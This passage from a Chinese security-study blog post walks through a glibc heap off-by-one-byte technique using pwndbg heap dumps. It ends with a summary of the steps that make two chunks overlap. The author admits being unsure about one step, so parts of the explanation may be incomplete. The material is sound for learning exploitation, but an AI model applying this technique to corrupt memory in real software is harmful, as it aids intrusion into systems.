class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">88</span>) —▸ <span class="number">0x6032b0</span> ◂— <span class="number">0x7ffff7dd1b78</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x603220</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000091</span>      &lt;=chunk_b2</span><br><span class="line"><span class="number">0x603230</span>:	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span>      </span><br><span class="line"><span class="number">0x603240</span>:	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x603250</span>:	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x603260</span>:	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x603270</span>:	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x603280</span>:	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x603290</span>:	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x6032a0</span>:	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x6032b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000061</span></span><br><span class="line"><span class="number">0x6032c0</span>:	<span class="number">0x00007ffff7dd1b78</span>	<span class="number">0x00007ffff7dd1b78</span></span><br></pre></td></tr></table></figure>
+<h3 id="free-b1-b1-0x603120"><a href="#free-b1-b1-0x603120" class="headerlink" title="free(b1)    b1 = 0x603120"></a>free(b1)    b1 = 0x603120</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Top Chunk: <span class="number">0x603540</span></span><br><span class="line">Last Remainder: <span class="number">0x6032b0</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x603000</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>, </span><br><span class="line">  size = <span class="number">0x111</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x603110</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>, </span><br><span class="line">  size = <span class="number">0x111</span>, </span><br><span class="line">  fd = <span class="number">0x6032b0</span>, </span><br><span class="line">  bk = <span class="number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="number">88</span>&gt;, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x603220</span> &#123;</span><br><span class="line">  prev_size = <span class="number">0x110</span>, </span><br><span class="line">  size = <span class="number">0x90</span>, </span><br><span class="line">  fd = <span class="number">0x4242424242424242</span>, </span><br><span class="line">  bk = <span class="number">0x4242424242424242</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x4242424242424242</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x4242424242424242</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x6032b0</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>, </span><br><span class="line">  size = <span class="number">0x61</span>, </span><br><span class="line">  fd = <span class="number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="number">88</span>&gt;, </span><br><span class="line">  bk = <span class="number">0x603110</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x603310</span> &#123;</span><br><span class="line">  prev_size = <span class="number">0x60</span>, </span><br><span class="line">  size = <span class="number">0x0</span>, </span><br><span class="line">  fd = <span class="number">0x210</span>, </span><br><span class="line">  bk = <span class="number">0x110</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x6032b0</span> —▸ <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">88</span>) —▸ <span class="number">0x603110</span> ◂— <span class="number">0x6032b0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="free-c-c-0x603330"><a href="#free-c-c-0x603330" class="headerlink" title="free(c)     c=0x603330"></a>free(c)     c=0x603330</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">pwndbg&gt;</span> <span class="string">heap</span></span><br><span class="line"><span class="attr">Top Chunk:</span> <span class="number">0x603540</span></span><br><span class="line"><span class="attr">Last Remainder:</span> <span class="number">0x6032b0</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x603000</span> <span class="string">PREV_INUSE</span> <span class="string">&#123;</span></span><br><span class="line">  <span class="string">prev_size</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">size</span> <span class="string">=</span> <span class="number">0x111</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd_nextsize</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk_nextsize</span> <span class="string">=</span> <span class="number">0x0</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="number">0x603110</span> <span class="string">PREV_INUSE</span> <span class="string">&#123;</span></span><br><span class="line">  <span class="string">prev_size</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">size</span> <span class="string">=</span> <span class="number">0x321</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd</span> <span class="string">=</span> <span class="number">0x6032b0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk</span> <span class="string">=</span> <span class="number">0x7ffff7dd1b78</span> <span class="string">&lt;main_arena+88&gt;,</span> </span><br><span class="line">  <span class="string">fd_nextsize</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk_nextsize</span> <span class="string">=</span> <span class="number">0x0</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="number">0x603430</span> <span class="string">&#123;</span></span><br><span class="line">  <span class="string">prev_size</span> <span class="string">=</span> <span class="number">0x320</span><span class="string">,</span> </span><br><span class="line">  <span class="string">size</span> <span class="string">=</span> <span class="number">0x110</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd_nextsize</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk_nextsize</span> <span class="string">=</span> <span class="number">0x0</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="number">0x603540</span> <span class="string">PREV_INUSE</span> <span class="string">&#123;</span></span><br><span class="line">  <span class="string">prev_size</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">size</span> <span class="string">=</span> <span class="number">0x20ac1</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd_nextsize</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk_nextsize</span> <span class="string">=</span> <span class="number">0x0</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">pwndbg&gt;</span> <span class="string">bins</span></span><br><span class="line"><span class="string">fastbins</span></span><br><span class="line"><span class="attr">0x20:</span> <span class="number">0x0</span></span><br><span class="line"><span class="attr">0x30:</span> <span class="number">0x0</span></span><br><span class="line"><span class="attr">0x40:</span> <span class="number">0x0</span></span><br><span class="line"><span class="attr">0x50:</span> <span class="number">0x0</span></span><br><span class="line"><span class="attr">0x60:</span> <span class="number">0x0</span></span><br><span class="line"><span class="attr">0x70:</span> <span class="number">0x0</span></span><br><span class="line"><span class="attr">0x80:</span> <span class="number">0x0</span></span><br><span class="line"><span class="string">unsortedbin</span></span><br><span class="line"><span class="attr">all:</span> <span class="number">0x6032b0</span> <span class="string">—▸</span> <span class="number">0x7ffff7dd1b78</span> <span class="string">(main_arena+88)</span> <span class="string">—▸</span> <span class="number">0x603110</span> <span class="string">◂—</span> <span class="number">0x6032b0</span></span><br><span class="line"><span class="string">smallbins</span></span><br><span class="line"><span class="string">empty</span></span><br><span class="line"><span class="string">largebins</span></span><br><span class="line"><span class="string">empty</span></span><br><span class="line"><span class="string">pwndbg&gt;</span></span><br></pre></td></tr></table></figure>
+<p>现在释放了chunk_b1和chunk_c:这将合并块chunk_b1和chunk_c(忘记’b2’)。为什么忽略了b2呢？<br>这步稍微有点没理解</p>
+<h3 id="d-malloc-0x300"><a href="#d-malloc-0x300" class="headerlink" title="d = malloc(0x300)"></a>d = malloc(0x300)</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">Top Chunk: <span class="number">0x603540</span></span><br><span class="line">Last Remainder: <span class="number">0x6032b0</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x603000</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>, </span><br><span class="line">  size = <span class="number">0x111</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x603110</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>, </span><br><span class="line">  size = <span class="number">0x321</span>, </span><br><span class="line">  fd = <span class="number">0x7ffff7dd1e88</span> &lt;main_arena+<span class="number">872</span>&gt;, </span><br><span class="line">  bk = <span class="number">0x7ffff7dd1e88</span> &lt;main_arena+<span class="number">872</span>&gt;, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x603430</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x320</span>, </span><br><span class="line">  size = <span class="number">0x111</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x603540</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>, </span><br><span class="line">  size = <span class="number">0x20ac1</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x7ffff7dd1bc8</span> (main_arena+<span class="number">168</span>) —▸ <span class="number">0x6032b0</span> ◂— <span class="number">0x7ffff7dd1bc8</span></span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
+<p>Now ‘d’ and ‘b2’ overlap(重叠) .</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>off - one - byte可以造成两个chunk重叠<br>利用条件:  </p>
+<ul>
+<li>存在off - one -byte漏洞  </li>
+<li>bypass “size(p) == prev_size(next_chunk)”</li>
+</ul>
+<p>申请4个a b c barrier -&gt; 第二个chunk在适当地址在写入一个值 -&gt;释放第2个 b -&gt;  第1个的off-one-byte覆盖掉第2个的size域的低字节 -&gt; 再申请一个小于b的 b1，此时要注意malloc的“size(p) == prev_size(next_chunk)”这个check，所以第二步，适当的地址是，chunk_b的地址加上这个新size 的这个地址，要往里写入的就是这个新size —&gt;  再申请小于剩下的unsortedbin的 b2 -&gt; 释放掉b1，释放掉c ，此时b1 c合并，忽略了b2-&gt; 再申请一个d，d和b2会重叠。   </p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/01/6.house_of_spirit/" rel="next" title="6.house_of_spirit">
+                <i class="fa fa-chevron-left"></i> 6.house_of_spirit
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/03/17/Asis%20CTF%202016%20b00ks/" rel="prev" title="Asis CTF 2016 b00ks">
+                Asis CTF 2016 b00ks <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">ha2</p>
+              <p class="site-description motion-element" itemprop="description">什么都可以不会，但不能学不会。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">101</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">52</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                我大佬们
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://f1aming.github.io/" title="f1aming" target="_blank">f1aming</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.hunya.io/" title="昏鸦" target="_blank">昏鸦</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00"><span class="nav-number">1.</span> <span class="nav-text">0x00</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01"><span class="nav-number">2.</span> <span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02"><span class="nav-number">3.</span> <span class="nav-text">0x02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03"><span class="nav-number">4.</span> <span class="nav-text">0x03</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04：bypass-size-chunk-prev-size-next-chunk"><span class="nav-number">5.</span> <span class="nav-text">0x04：bypass size(chunk) &#x3D;&#x3D; prev_size(next_chunk)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-off-one-byte"><span class="nav-number">6.</span> <span class="nav-text">0x05:off-one-byte</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-b1-malloc-0x100"><span class="nav-number">7.</span> <span class="nav-text">0x06 b1 &#x3D; malloc(0x100);</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x07-b2-malloc-0x80"><span class="nav-number">8.</span> <span class="nav-text">0x07 b2 &#x3D; malloc(0x80);</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#free-b1-b1-0x603120"><span class="nav-number">9.</span> <span class="nav-text">free(b1)    b1 &#x3D; 0x603120</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#free-c-c-0x603330"><span class="nav-number">10.</span> <span class="nav-text">free(c)     c&#x3D;0x603330</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#d-malloc-0x300"><span class="nav-number">11.</span> <span class="nav-text">d &#x3D; malloc(0x300)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">12.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ha2</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+
+  
+
+  
+
+</body>
+</html>
